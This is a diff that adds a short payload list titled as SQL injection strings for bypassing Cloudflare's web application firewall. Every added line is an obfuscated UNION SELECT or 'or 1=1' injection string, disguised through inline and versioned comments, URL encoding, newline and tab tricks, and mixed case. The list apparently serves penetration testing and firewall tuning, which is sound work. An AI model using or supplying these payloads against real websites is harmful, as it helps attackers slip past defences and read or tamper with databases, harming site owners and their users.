@@ -1,0 +1,25 @@
+# SQLi Cloudflare WAF Bypass Payloads
+/*!50000UNION*/+/*!50000SELECT*/+1,2,3--
+%55nion(%53elect)%20
++un/**/ion+se/**/lect+
+uni%6Fn+sel%65ct+
+UNION%23%0ASELECT
+UNION%23randomcomment%0ASELECT
+UNION%0ASELECT
+UNION%0D%0ASELECT
+UNION%09SELECT
+UNION%0BSELECT
+UNION ALL%23%0ASELECT
+/*!UNION*/ /*!SELECT*/
+/*!12345UNION*/ /*!12345SELECT*/
+%75%6e%69%6f%6e %73%65%6c%65%63%74
+unION sELecT
+UnIoN SeLeCt
+UNion SElect
+1'%20or%201%23
+' or 1=1 limit 1 offset 0#
+'%20or%201=1%20limit%201%20offset%200%23
+'/**/or/**/1/**/=/**/1--
+' /*!or*/ 1=1--
+%27%20||%201=1--
+'%0Aor%0A1=1--
